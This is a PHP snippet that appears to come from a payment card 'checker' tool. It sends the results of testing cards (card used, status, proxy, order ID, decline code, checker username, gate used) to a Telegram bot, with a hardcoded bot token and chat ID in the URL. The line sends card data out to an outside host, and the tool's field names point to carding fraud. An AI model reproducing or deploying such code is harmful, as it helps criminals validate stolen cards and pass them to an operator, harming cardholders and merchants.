<?php

file_get_contents('https://api.telegram.org/bot5991198323:AAHseFCcd2HXnwk_pjhoImwn-TyFZH5OYQI/sendmessage?chat_id=1205552129&text=--> Card Used - '.$lista.' %0A--> Status - '.$stealcode.' %0A--> Proxie - '.$proxiescarded.' %0A--> Order ID - '.$orderid.' %0A--> Decline Code- '.$stealdcode.' %0A--> Checked By - @'.$username.' %0A--> Gate Used - '.$message.'');

?>